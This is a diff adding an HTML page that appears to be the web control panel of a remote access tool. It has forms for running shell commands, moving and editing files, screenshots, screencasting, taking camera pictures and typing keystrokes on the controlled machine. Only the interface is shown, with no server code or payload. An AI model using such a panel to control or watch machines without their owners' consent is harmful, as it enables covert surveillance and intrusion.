@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <link rel="shortcut icon" href="static/favicon.png" type="image/png">
+    <meta name="theme-color" content="#000000" />
+    <style>
+        :root {
+            --terminal-background: rgba(0, 0, 0, 0.85);
+            --terminal-text: rgba(200, 200, 200, 1)
+        }
+
+        * {
+            margin: 0px;
+            padding: 0px;
+        }
+
+        body {
+            background-image: url('static/1.png');
+            background-repeat: no-repeat;
+            background-size: cover;
+            background-position: center;
+        }
+
+        .cont {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+        }
+
+        #shellwindow {
+            width: 65vw;
+            height: 90vh;
+            background-color: var(--terminal-background);
+            color: var(--terminal-text);
+            font-family: monospace;
+            font-size: 1rem;
+            padding: 20px;
+            overflow-y: scroll;
+            box-sizing: border-box;
+        }
+
+        #text {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        #cmdenter {
+            background-color: var(--terminal-background);
+            color: var(--terminal-text);
+            width:60vw;
+            height: 5vh;
+        }
+
+        #text button {
+            background-color: var(--terminal-text);
+            color: var(--terminal-background);
+            padding-left: 1px;
+            padding-right: 1px;
+            height: 5vh;
+            font-family: monospace;
+            font-weight: bold;
+            font-size: 1.5rem;
+            border: none;
+            border-radius: 1px;
+        }
+
+        .file, .update {
+            width: 200px;
+            height: 200px;
+            border-radius: 10px;
+            margin: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            background-color: var(--terminal-background);
+            box-shadow: 0px 0px 50px black;
+            color: var(--terminal-text);
+        }
+
+        .file input, .update input {
+            width: 150px;
+            height: 30px;
+            margin-bottom: 10px;
+            font-family: monospace;
+            font-weight: 600;
+            font-size: 1rem;
+        }
+
+        .update {
+            height: 100px;
+            font-size: 1.5rem;
+        }
+
+        @media screen and (max-width: 400px) {
+            .cont {
+                flex-direction: column;
+
+            }
+            #shellwindow {
+                order: -1;
+                width: 100vw;
+                height: 90vh;
+            }
+            #cmdenter {
+                width: 100vw;
+            }
+            #left form, #right form {
+                width: 100vw;
+                margin: auto;
+                margin-top: 1vw;
+            }
+        }
+
+    </style>
+</head>
+
+<body oncontextmenu="return false;">
+
+    <form hidden action="/recv" method="post">
+        <input type="text" name="recv" id="">
+        <button type="submit">sub</button>
+    </form>
+
+
+    <form action="/cmd" method="post" id="text">
+        <input type="text" name="cmd" id="cmdenter">
+        <button type="submit">Enter</button>
+    </form>
+
+    <div class="cont">
+
+        <div id="left">
+            <form action="/download" target="_blank" method="post" class="file">
+                <input type="text" name="downloadfile" id="" placeholder="Enter Filename">
+                <input type="submit" value="Download">
+            </form>
+            <form action="/screenshot" method="post" class="update" target="_blank">
+                <input type="submit" value="SCREENSHOT">
+            </form>
+            
+            <form action="/edit" target="_blank" method="post" class="file">
+                <input type="text" name="editfile" id="" placeholder="Enter Filename">
+                <input type="submit" value="Edit">
+            </form>
+        </div>
+        
+        <div id="shellwindow"></div>
+        <div id="right">
+            <form action="/upload" target="_blank" method="post" class="file" enctype="multipart/form-data">
+                <input type="file" name="uploadfiles[]" id="" multiple>
+                <input type="submit" value="Upload">
+            </form>
+            <form action="/screencast" method="post" class="update" target="_blank">
+                <input type="text" name="startsc" value="" hidden>
+                <input type="text" name="stopsc" value="" hidden>
+                <input type="submit" value="START SCREENCAST" onclick="document.getElementsByName('startsc')[0].value = 'start';document.getElementsByName('stopsc')[0].value = ''">
+                <input type="submit" value="STOP SCREENCAST" onclick="document.getElementsByName('stopsc')[0].value = 'stop';document.getElementsByName('startsc')[0].value = ''">
+            </form>
+            <form action="/camera" method="post" class="update" target="_blank">
+                <input type="submit" value="Take picture">
+            </form>
+            <form action="/type" target="_blank" method="post" class="file">
+                <input type="text" name="keys" id="" placeholder="Type here">
+                <input type="submit" value="Type">
+            </form>
+        </div>
+        
+    </div>
+    
+    <script>
+        var elem = document.getElementById('shellwindow');
+        elem.scrollTop = elem.scrollHeight;
+    </script>
+
+</body>
+
+</html>
